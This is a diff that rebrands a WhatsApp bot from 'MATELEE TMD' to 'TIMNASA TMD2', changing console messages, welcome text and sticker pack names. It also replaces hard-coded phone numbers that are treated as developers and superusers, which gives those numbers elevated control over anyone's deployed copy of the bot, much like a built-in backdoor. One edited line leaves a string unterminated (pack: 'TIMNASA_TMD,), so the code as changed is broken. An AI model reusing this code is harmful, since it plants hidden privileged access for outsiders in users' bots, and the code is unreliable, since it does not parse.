@@ -196,10 +196,10 @@ if (conf.AUTOREACT_STATUS=== "yes") {
             var membreGroupe = verifGroupe ? ms.key.participant : '';
             const { getAllSudoNumbers } = require("./bdd/sudo");
             const nomAuteurMessage = ms.pushName;
-            const dj = '255693629079';
-            const dj2 = '255693629079';
-            const dj3 = "255693629079";
-            const luffy = '255693629079';
+            const dj = '255784766591';
+            const dj2 = '255783766591';
+            const dj3 = "255784766591";
+            const luffy = '255784766591';
             const sudo = await getAllSudoNumbers();
             const superUserNumbers = [servBot, dj, dj2, dj3, luffy, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
@@ -207,7 +207,7 @@ if (conf.AUTOREACT_STATUS=== "yes") {
             
             var dev = [dj, dj2,dj3,luffy].map((t) => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
             function repondre(mes) { zk.sendMessage(origineMessage, { text: mes }, { quoted: ms }); }
-            console.log("\MATELE TMD is ONLINE");
+            console.log("\TIMNASA_TMD2 is ONLINE");
             console.log("=========== written message===========");
             if (verifGroupe) {
                 console.log("message provenant du groupe : " + nomGroupe);
@@ -470,7 +470,7 @@ function mybotpic() {
                                    // txt += `message supprimé \n @${auteurMessage.split("@")[0]} rétiré du groupe.`;
                                     const gifLink = "https://raw.githubusercontent.com/timnasax/TIMNASA_TMD2/main/media/remover.gif";
                                     var sticker = new Sticker(gifLink, {
-                                        pack: 'Zoou-Md',
+                                        pack: 'TIMNASA_TMD,
                                         author: conf.OWNER_NAME,
                                         type: StickerTypes.FULL,
                                         categories: ['🤩', '🎉'],
@@ -712,7 +712,7 @@ zk.ev.on('group-participants.update', async (group) => {
         const metadata = await zk.groupMetadata(group.id);
 
         if (group.action == 'add' && (await recupevents(group.id, "welcome") == 'on')) {
-            let msg = `*𝐌𝐀𝐓𝐄𝐋𝐄𝐄 𝐓𝐌𝐃. 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐈𝐍 𝐓𝐇𝐄 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄𝐒𝐒𝐀𝐆𝐄*`;
+            let msg = `*TIMNASA 𝐓𝐌𝐃2. 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐈𝐍 𝐓𝐇𝐄 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄𝐒𝐒𝐀𝐆𝐄*`;
             let membres = group.participants;
             for (let membre of membres) {
                 msg += ` \n]|I{•------»*𝐇𝐄𝐘* 🖐️ @${membre.split("@")[0]} 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐎𝐔𝐑 𝐆𝐑𝐎𝐔𝐏. \n\n`;
@@ -846,18 +846,18 @@ zk.ev.on('group-participants.update', async (group) => {
         zk.ev.on("connection.update", async (con) => {
             const { lastDisconnect, connection } = con;
             if (connection === "connecting") {
-                console.log("ℹ️ MATELEE TMD is connecting...");
+                console.log("ℹ️ TIMNASA TMD2 is connecting...");
             }
             else if (connection === 'open') {
-                console.log("✅ MATELEE TMD- Connected to WhatsApp! ☺️");
+                console.log("✅ TIMNASA TMD2- Connected to WhatsApp! ☺️");
                 console.log("--");
                 await (0, baileys_1.delay)(200);
                 console.log("------");
                 await (0, baileys_1.delay)(300);
                 console.log("------------------/-----");
-                console.log("MATELEE TMD is Online 🕸\n\n");
+                console.log("TIMNASA TMD2 is Online 🕸\n\n");
                 //chargement des commandes 
-                console.log("Loading MATELEE TMD Commands ...\n");
+                console.log("Loading TIMNASA TMD2 Commands ...\n");
                 fs.readdirSync(__dirname + "/commandes").forEach((fichier) => {
                     if (path.extname(fichier).toLowerCase() == (".js")) {
                         try {
@@ -888,9 +888,9 @@ zk.ev.on('group-participants.update', async (group) => {
                 
                 if((conf.DP).toLowerCase() === 'yes') {     
 
-                let cmsg =`      MATELEE TMD
+                let cmsg =`      *TIMNASA TMD2*
 ╭─────────────━┈⊷ 
-│🌏 MATELEE TMD CONNECTED
+│🌏 TIMNASA TMD2 NOW IS *ACTIVE*
 │💫 ᴘʀᴇғɪx: *[ ${prefixe} ]*
 │⭕ ᴍᴏᴅᴇ: *${md}*
 ╰─────────────━┈⊷⁠⁠⁠⁠`;
